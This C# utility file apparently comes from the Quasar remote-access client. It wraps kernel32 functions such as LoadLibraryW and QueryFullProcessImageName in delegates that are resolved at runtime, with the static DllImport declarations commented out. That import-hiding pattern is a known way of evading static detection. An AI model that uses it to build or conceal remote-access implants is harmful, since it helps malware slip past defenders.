using Quasar.Client.Win32PE.PE;
using Quasar.Client.Win32PE.Structs;
using Quasar.Common.Models;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Utilities
{
    /// <summary>
    /// Provides access to the Win32 API.
    /// </summary>
    public static partial class ClientNatives
    {
        // delegates
        //[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal delegate IntPtr LoadLibraryFunc([MarshalAs(UnmanagedType.LPWStr)] string lpFileName);
        internal static IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPWStr)] string lpFileName) => Lookup<LoadLibraryFunc>("kernel32.dll", "LoadLibraryW")(lpFileName);

        //[DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal delegate bool FreeLibraryFunc(IntPtr hModule);

        internal static bool FreeLibrary(IntPtr hModule) => Lookup<FreeLibraryFunc>("kernel32.dll", "FreeLibrary")(hModule);

        //[DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        //internal delegate IntPtr GetProcAddressFunc(IntPtr hModule, string procName);

        //[DllImport("kernel32.dll", SetLastError = true)]
        internal delegate bool QueryFullProcessImageNameFunc([In] IntPtr hProcess, [In] uint dwFlags, [Out] StringBuilder lpExeName, [In, Out] ref uint lpdwSize);
        internal static bool QueryFullProcessImageName(IntPtr hProcess, uint dwFlags, StringBuilder lpExeName, ref uint lpdwSize) => Lookup<QueryFullProcessImageNameFunc>("kernel32.dll", "QueryFullProcessImageName")(hProcess, dwFlags, lpExeName, ref lpdwSize);
    }
}
